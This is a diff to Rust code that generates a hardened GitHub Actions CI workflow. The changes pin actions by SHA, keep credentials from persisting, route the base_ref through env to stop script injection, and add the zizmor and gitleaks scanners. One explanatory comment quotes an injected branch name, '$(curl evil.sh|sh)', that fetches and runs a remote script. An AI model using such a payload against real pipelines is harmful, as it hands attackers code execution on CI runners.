@@ -472,7 +472,9 @@ checker and test collector, or they will report the fixtures as defects:\n      
   ruff     extend-exclude = [\".software-factory/mutations\"]\n      \
   eslint   ignores: [\".software-factory/mutations/**\"]\n      \
   pytest   norecursedirs = .software-factory\n      \
-  mypy     exclude = .software-factory/mutations";
+  mypy     exclude = .software-factory/mutations\n      \
+  bandit   exclude_dirs = [\".software-factory\"] in [tool.bandit]\n      \
+  zizmor   scan .github/workflows/ rather than the repository root";
 
 const NEXT_STEPS: &str = "# Next steps\n\n\
 The execution order. One table, short on purpose: this is the file to reread\n\
@@ -493,12 +495,29 @@ fn workflow(languages: &[String], selected: &[&crate::catalog::Rule]) -> String 
          on:\n  pull_request:\n  push:\n    branches: [main]\n\n\
          permissions:\n  contents: read\n\n\
          jobs:\n  factory:\n    runs-on: ubuntu-latest\n    steps:\n      \
-         - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n      \
+         # Actions are pinned by commit SHA, never by tag: a tag is a mutable\n      \
+         # pointer the action's owner can move under you, and a SHA is the only\n      \
+         # immutable release GitHub offers. The trailing comment is the version,\n      \
+         # because a bare SHA tells a reader nothing and gives a bump nothing to\n      \
+         # aim at.\n      \
+         - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        \
+         with:\n          fetch-depth: 0\n          \
+         # this job never pushes, so the checkout token has no reason to stay\n          \
+         # behind in .git/config where a later step can read it back out\n          \
+         persist-credentials: false\n      \
          - name: Install sf\n        run: cargo install --git https://github.com/nicolasmelo1/software-factory --locked\n      \
          # verify first: a check that stopped firing makes the run below\n      \
          # meaningless, and it is the cheaper failure to discover.\n      \
          - name: Prove the checks still fire\n        run: sf verify\n      \
-         - name: Check the repository\n        run: sf check --changed origin/${{ github.base_ref || 'main' }}\n",
+         # base_ref is the pull request author's branch name, and on a fork they\n      \
+         # choose it. Interpolated straight into `run:` that is script injection:\n      \
+         # the ${{ }} is substituted into the script before any shell sees it, so\n      \
+         # a branch named `$(curl evil.sh|sh)` executes as the runner. Through\n      \
+         # `env:` the value arrives as a variable the shell expands but never\n      \
+         # re-parses.\n      \
+         - name: Check the repository\n        env:\n          \
+         BASE_REF: ${{ github.base_ref || 'main' }}\n        \
+         run: sf check --changed \"origin/$BASE_REF\"\n",
     );
     if !selected.iter().any(|r| r.layer == crate::catalog::Layer::L6) {
         return out;
@@ -508,13 +527,38 @@ fn workflow(languages: &[String], selected: &[&crate::catalog::Rule]) -> String 
     // diff against — it then fails with an empty result and no explanation.
     out.push_str(
         "\n  hazards:\n    runs-on: ubuntu-latest\n    steps:\n      \
-         - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n",
+         - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        \
+         with:\n          fetch-depth: 0\n          persist-credentials: false\n",
     );
     out.push_str(
         // gitleaks-action refuses to scan a pull request without a token, and
         // says so only at run time. Passing the automatic one is the whole fix.
-        "      - name: Committed secrets\n        uses: gitleaks/gitleaks-action@v2\n        \
-         env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
+        // The token is required to scan a pull request at all; the two
+        // flags stop the action reaching for permissions the job does not
+        // grant, which it does by posting a comment and then failing 403.
+        "      - name: Committed secrets\n        \
+         uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2.3.9\n        \
+         env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          \
+         GITLEAKS_ENABLE_COMMENTS: \"false\"\n          \
+         GITLEAKS_ENABLE_SUMMARY: \"false\"\n",
+    );
+    // The workflow scanner is language-neutral — it reads this file, not the
+    // application — so it goes here rather than in `hazard_steps`.
+    out.push_str(
+        "      # The workflows are code too, and they are the code holding the\n      \
+         # tokens. Nothing else in this job reads them. actionlint is not the\n      \
+         # tool for this: it validates syntax and expressions, not injection.\n      \
+         - name: Insecure workflows\n        \
+         uses: zizmorcore/zizmor-action@3dc1ecc9bcb9e94e9b2c709687979e1298497054 # v0.6.2\n        \
+         with:\n          \
+         # Point it at the real workflows only. Left to walk the repository it\n          \
+         # also audits .software-factory/mutations, whose workflows are broken\n          \
+         # on purpose — every finding there is a fixture doing its job.\n          \
+         inputs: .github/workflows/\n          \
+         # the SARIF upload wants security-events: write, which this job does\n          \
+         # not grant. Annotations put each finding on the diff instead, and\n          \
+         # zizmor still exits non-zero, which is what fails the build.\n          \
+         advanced-security: false\n          annotations: true\n",
     );
     for language in languages {
         out.push_str(hazard_steps(language));
@@ -529,27 +573,34 @@ fn workflow(languages: &[String], selected: &[&crate::catalog::Rule]) -> String 
 fn hazard_steps(language: &str) -> &'static str {
     match language {
         "python" => concat!(
-            "      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.12'\n",
+            "      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n        with:\n          python-version: '3.12'\n",
             "      - run: pip install pip-audit bandit vulture\n",
             "      - name: Dependency vulnerabilities\n        run: pip-audit\n",
-            "      - name: Insecure patterns\n        run: bandit -r . --exclude ./.software-factory\n",
+            "      - name: Insecure patterns\n        run: bandit -r . --exclude ./.software-factory,./.venv,./node_modules,./tests\n",
             "      - name: Dead code\n        run: vulture . --exclude .software-factory\n",
         ),
         "typescript" => concat!(
-            "      - uses: actions/setup-node@v4\n        with:\n          node-version: '22'\n",
+            "      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0\n        with:\n          node-version: '22'\n",
             "      - name: Dependency vulnerabilities\n        run: npm audit --audit-level=high\n",
             "      - name: Insecure patterns\n        run: npx --yes semgrep --config auto --error --exclude .software-factory\n",
             "      - name: Dead code\n        run: npx --yes knip\n",
         ),
         "go" => concat!(
-            "      - uses: actions/setup-go@v5\n        with:\n          go-version: stable\n",
+            "      - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5.6.0\n        with:\n          go-version: stable\n",
             "      - name: Dependency vulnerabilities\n        run: go run golang.org/x/vuln/cmd/govulncheck@latest ./...\n",
             "      - name: Insecure patterns\n        run: go run github.com/securego/gosec/v2/cmd/gosec@latest -exclude-dir=.software-factory ./...\n",
             "      - name: Dead code\n        run: go run honnef.co/go/tools/cmd/staticcheck@latest ./...\n",
             "      - name: Data races\n        run: go test -race ./...\n",
         ),
         "rust" => concat!(
-            "      - name: Dependency vulnerabilities\n        uses: taiki-e/install-action@cargo-audit\n",
+            // The `@cargo-audit` shorthand tag cannot be hash-pinned:
+            // install-action's README warns that a pinned tool tag names a
+            // commit that leaves the repository on the next release. The
+            // versioned tag plus a `tool:` input is the form that pins, and it
+            // pins cargo-audit's own version along with it.
+            "      - name: Dependency vulnerabilities\n        \
+             uses: taiki-e/install-action@a2a5f6e99e1a31540baa0468acfa302cff0f359f # v2.86.4\n        \
+             with:\n          tool: cargo-audit\n",
             "      - run: cargo audit\n",
             "      - name: Insecure patterns and dead code\n        run: cargo clippy --all-targets -- -D warnings -D dead_code\n",
         ),
